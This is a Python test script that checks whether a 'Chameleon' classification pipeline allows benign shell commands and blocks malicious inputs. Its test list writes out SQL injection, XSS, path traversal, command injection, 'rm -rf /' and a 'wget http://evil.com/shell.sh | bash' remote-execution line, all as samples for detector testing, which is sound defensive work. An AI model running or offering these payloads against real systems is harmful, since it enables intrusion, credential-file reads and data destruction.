#!/usr/bin/env python3
"""
Chameleon Pipeline Classification Test
=======================================
Tests the two-stage evaluation pipeline to verify correct classification
of benign and malicious commands.

Usage:
    python test_pipeline_classification.py
"""

import asyncio
import sys
from pathlib import Path

# Add Backend to path
sys.path.insert(0, str(Path(__file__).parent))

from src.api.pipeline import evaluate_payload
from src.ml_engine.ml_classifier import classifier

print("=" * 70)
print("CHAMELEON PIPELINE CLASSIFICATION TEST")
print("=" * 70)

# Test cases with expected classifications
TEST_CASES = [
    # BENIGN COMMANDS (Expected: ALLOW)
    ("ls -la", "BENIGN", "List directory"),
    ("pwd", "BENIGN", "Print working directory"),
    ("git status", "BENIGN", "Git command"),
    ("npm install", "BENIGN", "NPM command"),
    ("python3 --version", "BENIGN", "Python version check"),
    ("What is the weather?", "BENIGN", "Normal question"),
    ("LOGIN:Rohit33", "BENIGN", "Normal username"),
    ("cd /home/user", "BENIGN", "Change directory"),
    ("cat README.md", "BENIGN", "View file"),
    ("mkdir test", "BENIGN", "Create directory"),
    
    # MALICIOUS COMMANDS (Expected: BLOCK)
    ("' OR '1'='1", "MALICIOUS", "SQL injection"),
    ("admin'--", "MALICIOUS", "SQL comment injection"),
    ("<script>alert(1)</script>", "MALICIOUS", "XSS script tag"),
    ("<img src=x onerror=alert(1)>", "MALICIOUS", "XSS image onerror"),
    ("../../../etc/passwd", "MALICIOUS", "Path traversal"),
    ("; cat /etc/passwd", "MALICIOUS", "Command injection"),
    ("| whoami", "MALICIOUS", "Pipe injection"),
    ("rm -rf /", "MALICIOUS", "Destructive command"),
    ("wget http://evil.com/shell.sh | bash", "MALICIOUS", "Remote code execution"),
    ("{{7*7}}", "MALICIOUS", "Template injection"),
]

async def test_pipeline():
    """Test the classification pipeline."""
    
    results = {
        "benign_correct": 0,
        "benign_total": 0,
        "malicious_correct": 0,
        "malicious_total": 0,
        "details": []
    }
    
    print("\n" + "=" * 70)
    print("TESTING CLASSIFICATION RESULTS")
    print("=" * 70 + "\n")
    
    for command, expected_type, description in TEST_CASES:
        # Get pipeline verdict
        verdict = await evaluate_payload(command)
        
        # Get classifier details
        classification = classifier.classify(command)
        
        # Determine if correct
        is_correct = (
            (expected_type == "BENIGN" and verdict == "ALLOW") or
            (expected_type == "MALICIOUS" and verdict == "BLOCK")
        )
        
        # Update counters
        if expected_type == "BENIGN":
            results["benign_total"] += 1
            if is_correct:
                results["benign_correct"] += 1
        else:
            results["malicious_total"] += 1
            if is_correct:
                results["malicious_correct"] += 1
        
        # Store details
        results["details"].append({
            "command": command[:50],
            "expected": expected_type,
            "verdict": verdict,
            "attack_type": classification.attack_type.value,
            "confidence": classification.confidence,
            "is_malicious": classification.is_malicious,
            "correct": is_correct,
            "description": description
        })
        
        # Print result
        status = "✅" if is_correct else "❌"
        verdict_emoji = "🟢" if verdict == "ALLOW" else "🔴"
        
        print(f"{status} {description}")
        print(f"   Command: {command}")
        print(f"   Expected: {expected_type}, Got: {verdict} {verdict_emoji}")
        print(f"   Attack Type: {classification.attack_type.value}")
        print(f"   Confidence: {classification.confidence:.2%}")
        print()
    
    return results

def print_summary(results):
    """Print test summary."""
    print("=" * 70)
    print("CLASSIFICATION SUMMARY")
    print("=" * 70)
    
    # Calculate accuracy
    benign_accuracy = (results["benign_correct"] / results["benign_total"] * 100) if results["benign_total"] > 0 else 0
    malicious_accuracy = (results["malicious_correct"] / results["malicious_total"] * 100) if results["malicious_total"] > 0 else 0
    total_correct = results["benign_correct"] + results["malicious_correct"]
    total_tests = results["benign_total"] + results["malicious_total"]
    overall_accuracy = (total_correct / total_tests * 100) if total_tests > 0 else 0
    
    print(f"\nBenign Commands:    {results['benign_correct']}/{results['benign_total']} ({benign_accuracy:.1f}%)")
    print(f"Malicious Commands: {results['malicious_correct']}/{results['malicious_total']} ({malicious_accuracy:.1f}%)")
    print(f"Overall:            {total_correct}/{total_tests} ({overall_accuracy:.1f}%)")
    
    print("\n" + "=" * 70)
    
    # Show misclassifications
    misclassifications = [d for d in results["details"] if not d["correct"]]
    
    if misclassifications:
        print("\n❌ MISCLASSIFICATIONS:")
        for m in misclassifications:
            print(f"  - {m['description']}: Expected {m['expected']}, Got {m['verdict']}")
            print(f"    Command: {m['command']}")
            print(f"    Attack Type: {m['attack_type']} (Confidence: {m['confidence']:.2%})")
    else:
        print("\n🎉 PERFECT CLASSIFICATION! All commands classified correctly.")
    
    print("\n" + "=" * 70)
    
    # Performance assessment
    if overall_accuracy >= 95:
        print("✅ EXCELLENT: Pipeline is production-ready")
    elif overall_accuracy >= 85:
        print("✅ GOOD: Pipeline is functional with minor issues")
    elif overall_accuracy >= 70:
        print("⚠️  FAIR: Pipeline needs improvement")
    else:
        print("❌ POOR: Pipeline requires significant tuning")
    
    print("=" * 70)
    
    return overall_accuracy

if __name__ == "__main__":
    # Run async test
    results = asyncio.run(test_pipeline())
    
    # Print summary
    accuracy = print_summary(results)
    
    # Exit with appropriate code
    if accuracy >= 85:
        sys.exit(0)  # Success
    else:
        sys.exit(1)  # Needs improvement
